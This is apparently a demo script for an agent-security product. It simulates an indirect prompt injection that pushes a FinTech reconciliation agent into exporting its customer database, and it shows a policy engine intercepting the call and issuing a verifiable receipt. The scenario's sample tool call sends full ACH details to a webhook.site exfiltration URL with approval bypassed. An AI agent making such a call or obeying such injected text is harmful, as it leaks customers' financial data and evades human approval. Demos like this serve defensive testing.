#!/usr/bin/env python3
"""
Detect & Demonstrate — independent cryptographic verification demo.

Simulates a FinTech agent exfiltration attempt, runs the harness policy engine,
emits a Universal Action Receipt (UAR), and prints the public /verify URL.

Usage:
    python scripts/simulate_independent_demo.py
    python scripts/simulate_independent_demo.py --write-public-json
"""

from __future__ import annotations

import argparse
import json
import sys
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
HARNESS = ROOT / "harness"
DEFAULT_PUBLIC_JSON = (
    ROOT / "nexus-shield-dashboard" / "public" / "demo" / "independent-verification-proof.json"
)
VERIFY_BASE = "https://nexus-shield-dashboard.vercel.app/verify"
REPORT_URL = "https://www.nexusshield.ai/reports/state-of-agent-security-2026"
RUNTIME_BENCHMARK = "P99 runtime intercept: 6.1ms (Nexus benchmark harness)"

FINTECH_SCENARIO = {
    "target": "Modern Treasury — FinTech payment reconciliation agent",
    "agent_id": "demo-fintech-recon-agent-01",
    "user_intent": "Reconcile August Invoice #8291 for Q3 ACH close (read-only report)",
    "attack_narrative": (
        "Indirect prompt injection steers the agent from read-only reconciliation "
        "to a bulk export + webhook exfiltration tool chain."
    ),
    "tool": "export_customer_database",
    "params": {
        "format": "csv",
        "destination": "https://webhook.site/exfil-fintech-demo",
        "include_ach_full_details": True,
        "bypass_approval": True,
    },
}


def _load_engine():
    sys.path.insert(0, str(HARNESS))
    from core.policy_engine import evaluate_proposed_action  # noqa: WPS433

    return evaluate_proposed_action


def build_demo_payload() -> dict:
    evaluate = _load_engine()
    s = FINTECH_SCENARIO
    evaluation = evaluate(
        agent_id=s["agent_id"],
        intent=s["user_intent"],
        tool=s["tool"],
        params=s["params"],
        identity_verified=False,
    )
    receipt = evaluation["receipt"]
    evidence_hash = receipt["evidence_bundle_hash"]
    receipt_id = receipt["receipt_id"]
    verify_url = f"{VERIFY_BASE}?receipt_hash={evidence_hash}&receipt_id={receipt_id}"

    return {
        "demo_id": "detect-and-demonstrate-fintech-2026",
        "generated_at_utc": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "positioning": "Agent Action Governance & Verification",
        "runtime_benchmark": RUNTIME_BENCHMARK,
        "report_url": REPORT_URL,
        "scenario": {
            "target": s["target"],
            "agent_id": s["agent_id"],
            "user_intent": s["user_intent"],
            "proposed_tool": s["tool"],
            "proposed_params": s["params"],
            "attack_vector": "LLM prompt injection -> MCP tool misuse -> data exfiltration",
        },
        "mitigation": {
            "decision": evaluation["decision"],
            "rule_id": evaluation["rule_id"],
            "risk_score": evaluation["risk_score"],
            "violations": evaluation["violations"],
            "summary": (
                f"Runtime Action Governance intercepted the tool call with decision "
                f"{evaluation['decision']} ({RUNTIME_BENCHMARK})."
            ),
        },
        "universal_action_receipt": receipt,
        "evidence_bundle_sha256": evidence_hash,
        "receipt_id": receipt_id,
        "verification_url": verify_url,
    }


def print_cli_report(payload: dict) -> None:
    print("\n=== Nexus Shield - Detect & Demonstrate (Independent Verification) ===\n")
    print(f"Target:     {payload['scenario']['target']}")
    print(f"Attack:     {payload['scenario']['attack_vector']}")
    print(f"Decision:   {payload['mitigation']['decision']} (rule {payload['mitigation']['rule_id']})")
    print(f"Receipt ID: {payload['receipt_id']}")
    print(f"SHA-256:    {payload['evidence_bundle_sha256']}")
    print(f"\nIndependent verify URL:\n{payload['verification_url']}\n")
    print(f"Report:     {payload['report_url']}\n")


def main() -> int:
    parser = argparse.ArgumentParser(description="FinTech independent verification demo simulator")
    parser.add_argument(
        "--write-public-json",
        action="store_true",
        help=f"Write {DEFAULT_PUBLIC_JSON.relative_to(ROOT)} for the /demo page",
    )
    parser.add_argument("--output", type=Path, default=None, help="Optional JSON output path")
    args = parser.parse_args()

    payload = build_demo_payload()
    print_cli_report(payload)

    out = args.output
    if args.write_public_json:
        out = out or DEFAULT_PUBLIC_JSON
    if out:
        out = out.resolve()
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(json.dumps(payload, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
        print(f"Wrote: {out}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
